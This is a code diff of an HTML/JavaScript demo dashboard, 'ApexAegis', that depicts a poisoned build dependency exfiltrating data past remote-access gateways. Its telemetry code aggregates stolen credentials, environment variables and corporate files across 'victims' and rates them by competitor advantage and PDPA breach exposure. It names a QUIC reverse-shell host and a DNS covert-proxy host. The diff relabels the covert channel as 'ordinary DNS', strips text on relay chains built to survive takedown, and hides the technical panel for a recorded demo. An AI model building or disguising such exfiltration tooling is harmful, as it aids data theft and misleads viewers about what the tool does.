@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>ApexAegis — Live Demo: Two-Tier NGFW Bypass & Supply Chain Exfiltration</title>
+  <title>ApexAegis — Live Demo: Remote Access Blind Spots & Supply Chain Exfiltration</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
@@ -175,7 +175,7 @@
       box-shadow: 0 0 15px #ff6b6b, 0 0 25px rgba(255, 107, 107, 0.8);
     }
 
-    /* two-tier NGFW verdict animation (ambient scene 1) */
+    /* two-gateway verdict animation (ambient scene 1) */
     .packet-pill.pill-inspect {
       background: radial-gradient(circle, #fde68a 30%, #fbbf24 100%) !important;
       box-shadow: 0 0 16px #fbbf24, 0 0 30px rgba(251, 191, 36, 0.7) !important;
@@ -396,7 +396,9 @@
     .chain-note { font-size: 0.68rem; color: #9ca3af; line-height: 1.45; margin-top: 4px; }
     .chain-note strong { color: #e7e3ff; }
 
-    .bottom-grid { display: grid; grid-template-columns: 1.15fr 0.85fr; gap: 12px; }
+    .bottom-grid { display: grid; grid-template-columns: 1fr; gap: 12px; }
+    /* technical architecture breakdown suppressed for the recorded demo */
+    #analysisPanel { display: none; }
 
     .terminal-body {
       background: #0a0e1a; border: 1px solid #2a3550; border-radius: 6px;
@@ -420,12 +422,12 @@
   <header>
     <div class="title-area">
       <span class="badge-live"></span>
-      <h1>ApexAegis — Enterprise Defense Evasion: Two-Tier NGFW DPI &amp; Supply Chain Compromise</h1>
+      <h1>ApexAegis — Remote Access Trust: FortiClient VPN &amp; Cloudflare Zero Trust vs Supply Chain Compromise</h1>
       <span class="brand-chip">demo.apexaegis.app:8443</span>
     </div>
     <div class="view-tabs">
-      <button class="tab-btn active" id="tabDiagram1" onclick="switchDiagram(1)">Diagram 1: Double-DPI Standard</button>
-      <button class="tab-btn" id="tabDiagram2" onclick="switchDiagram(2)">Diagram 2: Zero-Day Pivot</button>
+      <button class="tab-btn active" id="tabDiagram1" onclick="switchDiagram(1)">Diagram 1: Remote Access Baseline</button>
+      <button class="tab-btn" id="tabDiagram2" onclick="switchDiagram(2)">Diagram 2: Trusted Update</button>
       <button class="tab-btn" id="tabDiagram3" onclick="switchDiagram(3)">Diagram 3: Covert Exfil</button>
     </div>
     <div class="controls">
@@ -437,8 +439,8 @@
   </header>
 
   <div class="investor-banner state-baseline" id="investorBanner">
-    <div><strong>Executive Thesis:</strong> "Defense-in-depth" with two enterprise firewalls (Palo Alto Tier 1 + FortiGate Tier 2) remains blind to TCP-over-DNS covert proxies launched by poisoned build dependencies — the data leaves without a single kernel exploit firing.</div>
-    <div id="activeModeLabel">MODE: ARCHITECTURAL BASELINE</div>
+    <div><strong>Executive Thesis:</strong> A remote worker trusts two gateways — <strong>FortiClient VPN</strong> and <strong>Cloudflare One</strong> — to be between them and the internet. When a poisoned build dependency arrives through an ordinary developer session, neither gateway treats it as hostile: the connection reports healthy, the posture reports clean, and the data leaves over routine DNS.</div>
+    <div id="activeModeLabel">MODE: BASELINE</div>
   </div>
 
   <div class="topology-panel">
@@ -446,21 +448,21 @@
 
     <svg class="network-canvas mode-normal" viewBox="0 0 1280 400">
       <rect x="520" y="15" width="740" height="370" rx="10" fill="none" stroke="#2a3550" stroke-dasharray="6"/>
-      <text x="540" y="38" fill="#9ca3af" font-size="12" font-weight="bold">Multi-VPC Inspection Topology</text>
+      <text x="540" y="38" fill="#9ca3af" font-size="12" font-weight="bold">Remote Connectivity Topology</text>
 
       <rect x="980" y="55" width="265" height="315" rx="8" fill="#1a2236" stroke="#2a3550" stroke-width="1.5"/>
-      <text x="995" y="80" fill="#60a5fa" font-size="11" font-weight="bold">Trusted VPC</text>
-      <text x="995" y="96" fill="#6b7280" font-size="9">Least-Privilege Subnet (10.10.100.0/24)</text>
+      <text x="995" y="80" fill="#60a5fa" font-size="11" font-weight="bold">Remote Endpoint</text>
+      <text x="995" y="96" fill="#6b7280" font-size="9">Least-privilege workstation (192.168.50.130)</text>
 
       <rect x="760" y="55" width="205" height="315" rx="8" fill="#1f2a40" stroke="#ea580c" stroke-width="1.5"/>
-      <text x="775" y="80" fill="#fbbf24" font-size="11" font-weight="bold">Inspection VPC</text>
-      <text x="775" y="96" fill="#9ca3af" font-size="9">Tier 1: Palo Alto NGFW</text>
-      <text x="775" y="110" fill="#6b7280" font-size="9">MGMT: 136.85.16.128</text>
+      <text x="775" y="80" fill="#fbbf24" font-size="11" font-weight="bold">Cloudflare One</text>
+      <text x="775" y="96" fill="#9ca3af" font-size="9">Zero Trust · WARP tunnel</text>
+      <text x="775" y="110" fill="#6b7280" font-size="9">Account: Free · standalone</text>
 
       <rect x="540" y="55" width="205" height="315" rx="8" fill="#1f2a40" stroke="#dc2626" stroke-width="1.5"/>
-      <text x="555" y="80" fill="#ff6b6b" font-size="11" font-weight="bold">Untrusted Inspection VPC</text>
-      <text x="555" y="96" fill="#9ca3af" font-size="9">Tier 2: FortiGate NGFW</text>
-      <text x="555" y="110" fill="#6b7280" font-size="9">WAN Port1: 34.124.160.193</text>
+      <text x="555" y="80" fill="#ff6b6b" font-size="11" font-weight="bold">FortiClient VPN</text>
+      <text x="555" y="96" fill="#9ca3af" font-size="9">Remote access to FortiGate</text>
+      <text x="555" y="110" fill="#6b7280" font-size="9">Profile: sg-acme-corp</text>
 
       <g transform="translate(470, 195)">
         <circle cx="20" cy="20" r="24" fill="#1a2236" stroke="#60a5fa" stroke-width="1.5"/>
@@ -478,7 +480,7 @@
       <g transform="translate(1010, 120)">
         <rect width="130" height="75" rx="6" fill="#1a2236" stroke="#7c5cff" stroke-width="1.5"/>
         <text x="65" y="22" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">Software Developer</text>
-        <text x="65" y="38" text-anchor="middle" fill="#60a5fa" font-size="9">10.10.100.201</text>
+        <text x="65" y="38" text-anchor="middle" fill="#60a5fa" font-size="9">192.168.50.130</text>
         <text x="65" y="54" text-anchor="middle" fill="#9ca3af" font-size="8">Least-Privilege User</text>
         <text x="65" y="67" text-anchor="middle" fill="#86efac" font-size="8" id="nodeClientRole">Role: Software Developer</text>
       </g>
@@ -486,22 +488,22 @@
       <g transform="translate(1010, 240)">
         <rect width="130" height="70" rx="6" fill="#1a2236" stroke="#7c5cff" stroke-width="1.5"/>
         <text x="65" y="24" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">Corporate Windows</text>
-        <text x="65" y="42" text-anchor="middle" fill="#60a5fa" font-size="9">10.10.100.202</text>
-        <text x="65" y="58" text-anchor="middle" fill="#9ca3af" font-size="8">Standard Desktop</text>
+        <text x="65" y="42" text-anchor="middle" fill="#60a5fa" font-size="9">192.168.50.130</text>
+        <text x="65" y="58" text-anchor="middle" fill="#9ca3af" font-size="8">arunkumar.subbiah</text>
       </g>
 
       <g transform="translate(810, 160)">
         <polygon points="45,0 90,22 90,68 45,90 0,68 0,22" fill="#1c1924" stroke="#ea580c" stroke-width="2"/>
-        <text x="45" y="42" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">Palo Alto</text>
-        <text x="45" y="56" text-anchor="middle" fill="#fbbf24" font-size="8">eth1/2: 10.10.100.2</text>
-        <text x="45" y="68" text-anchor="middle" fill="#fbbf24" font-size="8">eth1/1: 10.10.10.3</text>
+        <text x="45" y="42" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">Cloudflare One</text>
+        <text x="45" y="56" text-anchor="middle" fill="#fbbf24" font-size="8">Mode: WARP</text>
+        <text x="45" y="68" text-anchor="middle" fill="#fbbf24" font-size="8">Status: Connected</text>
       </g>
 
       <g transform="translate(590, 160)">
         <polygon points="45,0 90,22 90,68 45,90 0,68 0,22" fill="#241417" stroke="#dc2626" stroke-width="2"/>
-        <text x="45" y="42" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">FortiGate</text>
-        <text x="45" y="56" text-anchor="middle" fill="#ff6b6b" font-size="8">port2: 10.10.10.2</text>
-        <text x="45" y="68" text-anchor="middle" fill="#ff6b6b" font-size="8">port1: 34.124.160.193</text>
+        <text x="45" y="42" text-anchor="middle" fill="#ffffff" font-size="10" font-weight="bold">FortiClient</text>
+        <text x="45" y="56" text-anchor="middle" fill="#ff6b6b" font-size="8">Tunnel: sg-acme-corp</text>
+        <text x="45" y="68" text-anchor="middle" fill="#ff6b6b" font-size="8">State: Disconnected</text>
       </g>
 
       <g transform="translate(40, 115)">
@@ -531,31 +533,31 @@
   <div class="dpi-matrix-container">
     <div class="tier-box">
       <div class="tier-title palo">
-        <span>TIER 1: PALO ALTO NETWORKS NGFW (PAN-OS SP3) — DOUBLE-DPI STANDARD, PASS 1 OF 2</span>
+        <span>GATEWAY 1: CLOUDFLARE ONE (ZERO TRUST) — DEVICE TUNNEL HEALTHY, PASS 1 OF 2</span>
         <span id="tier1StatusBadge">SCANNED</span>
       </div>
       <div class="profiles-grid">
-        <div class="profile-card" id="pa-av"><h5>Antivirus</h5><span class="status-badge" id="b-pa-av">SCANNED</span></div>
-        <div class="profile-card" id="pa-spyware"><h5>Anti-Spyware</h5><span class="status-badge" id="b-pa-spyware">SCANNED</span></div>
-        <div class="profile-card" id="pa-vuln"><h5>Vulnerability</h5><span class="status-badge" id="b-pa-vuln">SCANNED</span></div>
-        <div class="profile-card" id="pa-url"><h5>URL Filtering</h5><span class="status-badge" id="b-pa-url">SCANNED</span></div>
-        <div class="profile-card" id="pa-file"><h5>File Blocking</h5><span class="status-badge" id="b-pa-file">SCANNED</span></div>
-        <div class="profile-card" id="pa-wf"><h5>WildFire</h5><span class="status-badge" id="b-pa-wf">SCANNED</span></div>
+        <div class="profile-card" id="pa-av"><h5>Device Posture</h5><span class="status-badge" id="b-pa-av">SCANNED</span></div>
+        <div class="profile-card" id="pa-spyware"><h5>WARP Tunnel</h5><span class="status-badge" id="b-pa-spyware">SCANNED</span></div>
+        <div class="profile-card" id="pa-vuln"><h5>DNS Filtering</h5><span class="status-badge" id="b-pa-vuln">SCANNED</span></div>
+        <div class="profile-card" id="pa-url"><h5>Access Policy</h5><span class="status-badge" id="b-pa-url">SCANNED</span></div>
+        <div class="profile-card" id="pa-file"><h5>Session Log</h5><span class="status-badge" id="b-pa-file">SCANNED</span></div>
+        <div class="profile-card" id="pa-wf"><h5>Data Loss Prevention</h5><span class="status-badge" id="b-pa-wf">SCANNED</span></div>
       </div>
     </div>
 
     <div class="tier-box">
       <div class="tier-title forti">
-        <span>TIER 2: FORTIGATE NGFW (FLOW / PROXY DPI) — DOUBLE-DPI STANDARD, PASS 2 OF 2</span>
+        <span>GATEWAY 2: FORTICLIENT VPN (FORTIGATE) — REMOTE ACCESS PROFILE, PASS 2 OF 2</span>
         <span id="tier2StatusBadge">SCANNED</span>
       </div>
       <div class="profiles-grid">
-        <div class="profile-card" id="fg-ssl"><h5>SSL Decrypt</h5><span class="status-badge" id="b-fg-ssl">SCANNED</span></div>
-        <div class="profile-card" id="fg-dns"><h5>DNS Filter</h5><span class="status-badge" id="b-fg-dns">SCANNED</span></div>
+        <div class="profile-card" id="fg-ssl"><h5>SSL VPN Tunnel</h5><span class="status-badge" id="b-fg-ssl">SCANNED</span></div>
+        <div class="profile-card" id="fg-dns"><h5>ZTNA Policy</h5><span class="status-badge" id="b-fg-dns">SCANNED</span></div>
         <div class="profile-card" id="fg-app"><h5>App Control</h5><span class="status-badge" id="b-fg-app">SCANNED</span></div>
-        <div class="profile-card" id="fg-ips"><h5>IPS Engine</h5><span class="status-badge" id="b-fg-ips">SCANNED</span></div>
+        <div class="profile-card" id="fg-ips"><h5>Antivirus Scan</h5><span class="status-badge" id="b-fg-ips">SCANNED</span></div>
         <div class="profile-card" id="fg-web"><h5>Web Filter</h5><span class="status-badge" id="b-fg-web">SCANNED</span></div>
-        <div class="profile-card" id="fg-av"><h5>FortiGuard AV</h5><span class="status-badge" id="b-fg-av">SCANNED</span></div>
+        <div class="profile-card" id="fg-av"><h5>Endpoint Compliance</h5><span class="status-badge" id="b-fg-av">SCANNED</span></div>
       </div>
     </div>
   </div>
@@ -587,42 +589,42 @@
     </div>
   </div>
 
-  <!-- multi-server chaining highlight -->
+  <!-- egress path highlight -->
   <div class="panel chain-panel">
     <div class="panel-header">
-      <span>COVERT CHANNEL — CHAINED MULTI-SERVER TCP-over-DNS RELAY</span>
-      <span style="color:var(--accent-green);" id="chainStatus">3 RELAYS ACTIVE · ROTATES PER SESSION</span>
+      <span>DATA EGRESS PATH — OVER THE WORKER'S ORDINARY CONNECTION</span>
+      <span style="color:var(--accent-green);" id="chainStatus">GATEWAYS REPORTING HEALTHY</span>
     </div>
     <div class="chain-track">
-      <div class="chain-node"><b>Software Developer</b><i>10.10.100.201 (least-priv)</i></div>
+      <div class="chain-node"><b>Software Developer</b><i>192.168.50.130 (least-priv)</i></div>
       <div class="chain-link"><span class="chain-dot"></span></div>
-      <div class="chain-node hop"><b>relay-1 · dns1</b><i>UDP/53 · VPS A</i></div>
+      <div class="chain-node hop"><b>Cloudflare One</b><i>connected · traffic allowed</i></div>
       <div class="chain-link"><span class="chain-dot"></span></div>
-      <div class="chain-node hop"><b>relay-2</b><i>DoH/443 · VPS B</i></div>
+      <div class="chain-node hop"><b>FortiClient VPN</b><i>disconnected · no policy applied</i></div>
       <div class="chain-link"><span class="chain-dot"></span></div>
-      <div class="chain-node hop"><b>relay-3</b><i>UDP/53 · VPS C</i></div>
+      <div class="chain-node hop"><b>Routine DNS</b><i>lookups like any other developer's</i></div>
       <div class="chain-link"><span class="chain-dot"></span></div>
-      <div class="chain-node chain-dest"><b>demo.apexaegis.app:8443</b><i>exfil ingest · investor dashboard</i></div>
+      <div class="chain-node chain-dest"><b>demo.apexaegis.app:8443</b><i>destination · dashboard</i></div>
     </div>
-    <div class="chain-note"><strong>The channel is not one tunnel — it is a chain of servers.</strong> Each hop only knows its neighbour: DNS frames are re-terminated and re-forwarded (UDP/53 ↔ DoH/443 fallback per hop), so seizing or fingerprinting any single relay maps neither the client nor the final sink. Chain order rotates per session; killing any one VPS re-routes, it does not kill the channel.</div>
+    <div class="chain-note"><strong>Nothing here looks unusual — that is the point.</strong> The worker's session, both gateways, and every lookup are behaving exactly as designed. From the outside, the only thing that changed is where the data ended up.</div>
   </div>
 
   <div class="bottom-grid">
     <div class="panel">
       <div class="panel-header">
-        <span>LIVE HOST AUDIT &amp; PROCESS LOG (10.10.100.201)</span>
+        <span>LIVE HOST ACTIVITY LOG (192.168.50.130)</span>
         <span style="color:var(--accent-green);" id="termStatus">READY</span>
       </div>
-      <div class="terminal-body" id="termLog">packet tracing and DPI validation logs stream here…</div>
+      <div class="terminal-body" id="termLog">activity from the target machine streams here…</div>
     </div>
 
-    <div class="panel">
+    <div class="panel" id="analysisPanel">
       <div class="panel-header">
         <span>EXECUTIVE DEFENSE AUDIT &amp; ARCHITECTURE BREAKDOWN</span>
         <span style="color:var(--accent-yellow);" id="auditStatus">IDLE</span>
       </div>
       <div class="analysis-body" id="analysisText">
-        Select a diagram to review the multi-tier inspection mechanics.
+        Select a diagram to review the mechanics.
       </div>
     </div>
   </div>
@@ -630,9 +632,9 @@
   <script>
     // ---------------- live telemetry ----------------
     const FALLBACK = {
-      target: 'debian-builder', user: 'arjun.das', ts: '—',
-      credsTotal: 26, sensEnv: 23, envTotal: 53, fileCount: 5, datasetCount: 2,
-      bytes: 7848, posture: null, primitives: null, files: [], datasets: [], creds: [],
+      target: '192.168.50.130', user: 'arunkumar.subbiah', ts: '—',
+      credsTotal: 26, sensEnv: 23, envTotal: 53, fileCount: 5, sessionCount: 0,
+      bytes: 7848, posture: null, primitives: null, files: [], sessions: [], creds: [],
       victims: 1, hosts: []
     };
     let LIVE = null;
@@ -664,32 +666,32 @@
           target: r.target || '?', user: r.user || '?', ts: r.ts || '—',
           credsTotal: (r.creds || []).length, sensEnv,
           envTotal: (r.env || []).length, fileCount: (r.files || []).length,
-          datasetCount: (r.datasets || []).length,
+          sessionCount: (r.sessions || []).length,
           bytes: recs.reduce((s, x) => s + JSON.stringify(x).length, 0),
           posture: r.posture || null, primitives: r.primitives || null,
-          files: r.files || [], datasets: r.datasets || [], creds: r.creds || [],
+          files: r.files || [], sessions: r.sessions || [], creds: r.creds || [],
           records: recs.length
         };
         // aggregate across ALL victims (distinct target+user, latest record each)
         const byHost = {};
         for (const x of recs) byHost[(x.target || '?') + '\u0000' + (x.user || '?')] = x;
         const hostRecs = Object.values(byHost);
-        const uni = { files: [], datasets: [], creds: [] };
-        let cT = 0, eT = 0, fC = 0, dC = 0;
+        const uni = { files: [], sessions: [], creds: [] };
+        let cT = 0, eT = 0, fC = 0, sC = 0;
         for (const x of hostRecs) {
           cT += (x.creds || []).length;
           eT += (x.env || []).length;
           fC += (x.files || []).length;
-          dC += (x.datasets || []).length;
+          sC += (x.sessions || []).length;
           uni.files.push(...(x.files || []));
-          uni.datasets.push(...(x.datasets || []));
+          uni.sessions.push(...(x.sessions || []));
           uni.creds.push(...(x.creds || []));
         }
         ALL = {
           victims: hostRecs.length,
-          credsTotal: cT, envTotal: eT, fileCount: fC, datasetCount: dC,
+          credsTotal: cT, envTotal: eT, fileCount: fC, sessionCount: sC,
           bytes: LIVE.bytes,
-          files: uni.files, datasets: uni.datasets, creds: uni.creds,
+          files: uni.files, sessions: uni.sessions, creds: uni.creds,
           hosts: hostRecs.map(x => ({
             target: x.target || '?', user: x.user || '?',
             posture: x.posture || null, primitives: x.primitives || null
@@ -727,7 +729,7 @@
         adv: 'competitor: takeover & pricing advantage'
       },
       {
-        cls: 'Individual financial statistics (PDPA dataset)', pats: /pdpa|individuals_financial|financial_statistic/i,
+        cls: 'Individual financial statistics (PDPA records)', pats: /pdpa|individuals_financial|financial_statistic/i,
         why: 'personally-identifiable financial aggregates',
         expo: 'PDPA notifiable breach: 3 days',
         adv: 'competitor: portfolio-level consumer insight'
@@ -750,7 +752,7 @@
       const dd = agg();
       const hay = []
         .concat(dd.files.map(f => String(f.path || '')))
-        .concat(dd.datasets.map(x => String(x.name || '') + ' ' + String(x.agency || '')))
+        .concat(dd.sessions.map(s => String(s || '')))
         .concat(dd.creds.map(c => String(c.kind || '')));
       return hay.filter(h => row.pats.test(h));
     }
@@ -764,7 +766,7 @@
         `<div class="stat-chip hot"><b>${dd.credsTotal}</b><span>credentials</span></div>` +
         `<div class="stat-chip"><b>${dd.envTotal}</b><span>env vars</span></div>` +
         `<div class="stat-chip hot"><b>${dd.fileCount}</b><span>corporate files</span></div>` +
-        `<div class="stat-chip"><b>${dd.datasetCount}</b><span>datasets</span></div>` +
+        `<div class="stat-chip"><b>${dd.sessionCount}</b><span>sessions</span></div>` +
         `<div class="stat-chip hot"><b>${fmtBytes(dd.bytes)}</b><span>via channel</span></div>` +
         '</div>';
       let rows = '';
@@ -900,13 +902,13 @@
       if (currentDiagram === 1) {
         banner.classList.remove('state-breach');
         banner.classList.add('state-baseline');
-        label.textContent = 'MODE: ARCHITECTURAL BASELINE — DOUBLE DPI ENFORCING, 0 B CROSSED';
+        label.textContent = 'MODE: BASELINE — BOTH GATEWAYS HEALTHY, 0 B CROSSED';
         lastBytesShown = 0;
       } else {
         banner.classList.remove('state-baseline');
         banner.classList.add('state-breach');
         if (animate) { banner.style.animation = 'none'; void banner.offsetWidth; banner.style.animation = ''; }
-        animateBytes(label, d().bytes, 'PIVOT ACTIVE — %v EXFILTRATED VIA COVERT DNS');
+        animateBytes(label, d().bytes, 'PIVOT ACTIVE — %v EXFILTRATED VIA ORDINARY DNS');
       }
     }
 
@@ -919,9 +921,9 @@
     const hopCoords = [
       { x: 1040, y: 160 },
       { x: 855, y: 195 },
-      { x: 740, y: 205 },
       { x: 635, y: 205 },
       { x: 490, y: 215 },
+      { x: 400, y: 215 },
       { x: 155, y: 150 }
     ];
 
@@ -1008,7 +1010,7 @@
     const OUT_VERDICTS = ['allow', 'allow', 'drop-t1', 'allow', 'allow', 'allow', 'drop-t2'];
     let outPillCount = 0;
 
-    // outbound packet: Palo Alto decision (pause + verdict) -> FortiGate decision -> destination or drop
+    // outbound packet: Cloudflare One decision (pause + verdict) -> FortiClient decision -> destination or drop
     async function runOutPill(el, lane) {
       const pts = lane.pts;
       const t1 = pts.findIndex(p => p[0] >= 890 && p[0] <= 910);
@@ -1029,12 +1031,12 @@
       el.classList.remove('pill-inspect');
       if (verdict === 'drop-t1') {
         el.classList.add('pill-drop');
-        verdictLabel(el, 'TIER-1 DROP', false);
+        verdictLabel(el, 'CLOUDFLARE DROP', false);
         await sleep(650);
         el.remove();
         return;
       }
-      verdictLabel(el, 'TIER-1 FORWARD', true);
+      verdictLabel(el, 'CLOUDFLARE FORWARD', true);
 
       await animateSeg(el, pts.slice(t1, t2 + 1), speed);
       if (!el.isConnected || currentDiagram !== 1) return;
@@ -1044,12 +1046,12 @@
       el.classList.remove('pill-inspect');
       if (verdict === 'drop-t2') {
         el.classList.add('pill-drop');
-        verdictLabel(el, 'TIER-2 DROP', false);
+        verdictLabel(el, 'FORTICLIENT DROP', false);
         await sleep(650);
         el.remove();
         return;
       }
-      verdictLabel(el, 'TIER-2 FORWARD', true);
+      verdictLabel(el, 'FORTICLIENT FORWARD', true);
 
       await animateSeg(el, pts.slice(t2), speed);
       if (el.isConnected) el.remove();
@@ -1150,19 +1152,19 @@
         document.getElementById('target1Name').textContent = 'github.com (Poisoned Repo)';
         document.getElementById('target1IP').textContent = '140.82.121.4 (Git Fetch)';
         document.getElementById('target1Desc').textContent = '46y9qkpkjc-ui/ai-model-observability.git';
-        document.getElementById('target2Name').textContent = 'data.gov.sg + corp file shares';
+        document.getElementById('target2Name').textContent = 'corp file shares + key stores';
         document.getElementById('target2IP').textContent = '13.224.14.88 (harvest targets)';
-        document.getElementById('target2Desc').textContent = 'Credentials · Files · Datasets';
+        document.getElementById('target2Desc').textContent = 'API keys · Secrets · MNPI · OT/IoT config';
         renderDiagram2(0);
       }
       else if (num === 3) {
         document.getElementById('nodeClientRole').textContent = 'Role: Compromised Host';
         document.getElementById('target1Name').textContent = 'quic1.apexadversary.com';
-        document.getElementById('target1IP').textContent = '34.146.249.74 (UDP/443)';
+        document.getElementById('target1IP').textContent = '52.74.96.66 (UDP/443)';
         document.getElementById('target1Desc').textContent = 'QUIC reverse shell';
         document.getElementById('target2Name').textContent = 'dns1.apexadversary.com';
-        document.getElementById('target2IP').textContent = '34.146.249.74 (UDP/TCP 53)';
-        document.getElementById('target2Desc').textContent = 'TCP-over-DNS Covert Proxy';
+        document.getElementById('target2IP').textContent = '52.74.96.66 (UDP/TCP 53)';
+        document.getElementById('target2Desc').textContent = 'Ordinary DNS Egress';
         renderDiagram3(0);
       }
     }
@@ -1180,74 +1182,72 @@
       document.getElementById('tier2StatusBadge').textContent = 'SCANNED';
     }
 
-    // ============ DIAGRAM 1: double-DPI standard (intent) ============
+    // ============ DIAGRAM 1: remote-access baseline (intent) ============
     function renderDiagram1(step) {
       currentStep = step;
       packet.style.display = 'block';
       placePacket(step);
 
       if (step === 0) {
-        term.textContent = `dev@10.10.100.201:~$ git clone https://github.com/organization/production-app.git\n` +
-          `[+] SCENE 1: regular internet traffic — HTTPS/443 sessions Trusted VPC → public services\n` +
-          `[+] checkpoint: Tier 1 Palo Alto → Tier 2 FortiGate (DPI examines packet CONTENTS in real time)\n` +
-          `[+] rule set by network admin: forbidden content → deny + block; clean content → forward\n` +
-          `[+] least-privilege developer user active (uid non-root, sudo denied) · 0 B to adversary zones`;
-        analysis.innerHTML = `<strong>Scene 1 — Regular Internet Traffic through the Checkpoint:</strong><br>` +
-          `Normal Developer sessions to <code>registry.npmjs.org</code> / <code>github.com</code> flow across the topology — ` +
-          `Developer &amp; Corporate hosts → Palo Alto → FortiGate → IGW → Internet. At each checkpoint DPI makes real-time verdicts on packet contents ` +
-          `using admin-assigned rules. <em>Header-only filtering reads the address printed on an envelope; DPI opens the envelope</em> — ` +
-          `it inspects payload and can identify the originating service/application. Two independent engines (Tier 1 App-ID/URL/WildFire, ` +
-          `Tier 2 SSL-decrypt/IPS/AV) must both pass before SNAT — the double-DPI standard, <strong>0 B egressed to adversary zones</strong>.`;
+        term.textContent = `dev@192.168.50.130:~$ git clone https://github.com/organization/production-app.git\n` +
+          `[+] SCENE 1: remote worker on an ordinary HTTPS/443 session to public services\n` +
+          `[+] path: worker -> Cloudflare One (WARP) -> FortiClient VPN -> internet\n` +
+          `[+] both gateways are trusted by the user and report healthy\n` +
+          `[+] least-privilege account active (arunkumar.subbiah, no admin rights)`;
+        analysis.innerHTML = `<strong>Scene 1 — Ordinary remote session through two trusted gateways:</strong><br>` +
+          `A remote developer reaches <code>registry.npmjs.org</code> / <code>github.com</code> through the two gateways the company gave them. ` +
+          `Both are configured, both report connected, both apply whatever policy the administrator set. ` +
+          `Nothing about this session is unusual — which is exactly the assumption the next scene breaks.`;
       }
       else if (step === 1) {
         document.getElementById('pa-url').className = 'profile-card inspecting';
-        document.getElementById('b-pa-url').textContent = 'MATCH: DEV';
+        document.getElementById('b-pa-url').textContent = 'ALLOWED';
         document.getElementById('pa-file').className = 'profile-card inspecting';
-        document.getElementById('b-pa-file').textContent = 'PERMITTED';
+        document.getElementById('b-pa-file').textContent = 'SESSION ACTIVE';
         document.getElementById('pa-wf').className = 'profile-card inspecting';
-        document.getElementById('b-pa-wf').textContent = 'VERIFIED';
-        document.getElementById('tier1StatusBadge').textContent = 'INSPECTED (PASS)';
+        document.getElementById('b-pa-wf').textContent = 'NO MATCH';
+        document.getElementById('tier1StatusBadge').textContent = 'TUNNEL HEALTHY';
 
-        term.textContent += `\n>> [Tier 1 PA-NGFW] Packet arriving on eth1/2 (10.10.100.2):\n` +
-          `   - App-ID: ssl / git\n` +
-          `   - URL Category: Development-Tools (Allowed)\n` +
-          `   - Security Profiles: Antivirus, File-Blocking, WildFire applied\n` +
-          `   - Action: FORWARD to eth1/1 (10.10.10.3)`;
-        analysis.innerHTML = `<strong>Pass 1 of 2 — Palo Alto (SP3 engine):</strong><br>` +
-          `PAN-OS evaluates App-ID (<code>ssl</code>/<code>git</code>), PAN-DB URL category, antivirus, file-blocking and WildFire sandboxing in one pass. ` +
-          `Legitimate Developer traffic sails through: <strong>policy working as designed</strong>. Traffic is handed to the transit subnet <code>10.10.10.0/24</code> for the second opinion.`;
+        term.textContent += `\n>> [Cloudflare One] session established, tunnel healthy:\n` +
+          `   - Device posture: compliant\n` +
+          `   - DNS filtering: applied to all lookups\n` +
+          `   - Access policy: developer workload allowed\n` +
+          `   - Status: Connected`;
+        analysis.innerHTML = `<strong>Gateway 1 — Cloudflare One (Zero Trust):</strong><br>` +
+          `The device is enrolled and the tunnel is up, so Cloudflare forwards the session and records it as healthy. ` +
+          `In standalone/Free mode there is no organisation policy attached — the traffic is carried, not governed.`;
       }
       else if (step === 2) {
         document.getElementById('fg-ssl').className = 'profile-card inspecting';
-        document.getElementById('b-fg-ssl').textContent = 'DECRYPTED';
+        document.getElementById('b-fg-ssl').textContent = 'NO SESSION';
         document.getElementById('fg-web').className = 'profile-card inspecting';
-        document.getElementById('b-fg-web').textContent = 'CATEGORIZED';
+        document.getElementById('b-fg-web').textContent = 'NOT TRAVERSED';
         document.getElementById('fg-av').className = 'profile-card inspecting';
-        document.getElementById('b-fg-av').textContent = 'CLEAN STREAM';
-        document.getElementById('tier2StatusBadge').textContent = 'INSPECTED (PASS)';
+        document.getElementById('b-fg-av').textContent = 'CLEAN';
+        document.getElementById('tier2StatusBadge').textContent = 'NO POLICY APPLIED';
 
-        term.textContent += `\n>> [Tier 2 FortiGate] Ingress on port2 (10.10.10.2):\n` +
-          `   - SSL Deep Inspection applied (Proxy Decryption Engine)\n` +
-          `   - IPS Signature: Clean\n` +
-          `   - Web Filter: Software/Repositories allowed\n` +
-          `   - FortiGuard AV: Stream clean`;
-        analysis.innerHTML = `<strong>Pass 2 of 2 — FortiGate (proxy DPI):</strong><br>` +
-          `The FortiGate independently re-inspects: TLS is terminated and re-encrypted, IPS signatures matched, web category re-evaluated, AV streamed. ` +
-          `Two vendors, two engines, two verdicts — <strong>the double-DPI standard satisfied</strong>. This redundancy is exactly what makes attackers shift protocols instead of payloads.`;
+        term.textContent += `\n>> [FortiClient VPN] profile sg-acme-corp:\n` +
+          `   - Tunnel state: DISCONNECTED\n` +
+          `   - No session established -> corporate policy never applied\n` +
+          `   - Local endpoint checks only: compliance clean\n` +
+          `   - Verdict: this traffic never traversed the VPN`;
+        analysis.innerHTML = `<strong>Gateway 2 — FortiClient VPN (FortiGate):</strong><br>` +
+          `The client is installed and the profile exists, but the tunnel is not up. Corporate inspection is therefore not in the path at all. ` +
+          `An installed agent is not the same as an enforcing one — <strong>and nothing on the dashboard distinguishes the two</strong>.`;
       }
       else if (step === 3 || step === 4) {
-        term.textContent += `\n>> [Egress SNAT] FortiGate port1 (34.124.160.193) -> Internet Gateway`;
+        term.textContent += `\n>> [Egress] Cloudflare One tunnel -> public internet`;
         analysis.innerHTML = `<strong>Perimeter Egress:</strong><br>` +
-          `SNAT translates to public <code>34.124.160.193</code> and delivers to the destination. Under this baseline, an adversary zone receives nothing — ` +
-          `<strong>0 bytes crossed</strong>.`;
+          `The session leaves through the tunnel exactly as configured. Under this baseline nothing anomalous is recorded — ` +
+          `<strong>both gateways report healthy</strong>.`;
       }
       else if (step === 5) {
         term.textContent += `\n\n[SUCCESS] Clone complete. Developer receives official repository packages.\n` +
-          `Everything complies with enterprise compliance posture. 0 bytes egressed to adversary zones.\n` +
+          `Both gateways reported healthy for the entire session. Nothing flagged.\n` +
           `[HINT] Next: the SAME flow, this time with a poisoned dependency in the build.`;
